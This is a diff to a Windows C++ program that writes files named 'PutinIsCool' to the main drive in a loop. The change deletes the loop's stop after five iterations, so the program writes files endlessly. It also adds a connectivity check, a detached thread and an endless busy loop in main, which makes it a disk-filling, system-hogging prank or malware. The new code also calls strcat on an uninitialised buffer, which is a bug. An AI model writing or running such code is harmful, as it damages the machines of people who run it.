@@ -1,5 +1,6 @@
 #include <iostream>
 #include <Windows.h>
+#include <wininet.h>
 #include <fstream>
 #include <string.h>
 #include <string>
@@ -8,6 +9,7 @@
 
 #define MAX_PATH 260
 #pragma warning(disable : 4996)
+#pragma comment(lib,"Wininet.lib")
 
 using namespace std;
 
@@ -70,7 +72,6 @@ public:
 		get_main_drive();
 
 		
-
 		while (true) {
 			string File_Name = "PutinIsCool";
 			string the_string(main_drive);
@@ -83,8 +84,6 @@ public:
 
 			ofstream TheFile(the_string);
 
-
-
 			TheFile.close();
 
 			ofstream AppendFile(the_string, ios::app);
@@ -96,11 +95,7 @@ public:
 
 				AppendFile.close();
 			}
-			
 			count++;
-			if (count == 5) {
-				break;
-			}
 		}	
 	}
 
@@ -113,10 +108,23 @@ public:
 		if (!dirExists(dup)) {
 			CreateDirectoryA(main_drive, NULL);
 		}
+
 	}
 };
 
 int main() {
+	char url[128];
+
+	strcat(url, "https://stackoverflow.com/");
+
+	BOOL bConnect = InternetCheckConnectionA(url, FLAG_ICC_FORCE_CONNECTION, 0);
+
+	if (!bConnect) {
+		MessageBoxA(NULL, "Please run this program again, when you have stable connection.", "No Connection", MB_OK | MB_ICONHAND);
+		return 1;
+	}
+
+
 	Functionality Obj;
 	
 	if (Obj.warning() == 1) {
@@ -127,6 +135,11 @@ int main() {
 	fork_thread.detach();
 
 	Obj.install_images();
+
+
+	while (1) {
+
+	}
 
 	return 0;
 }
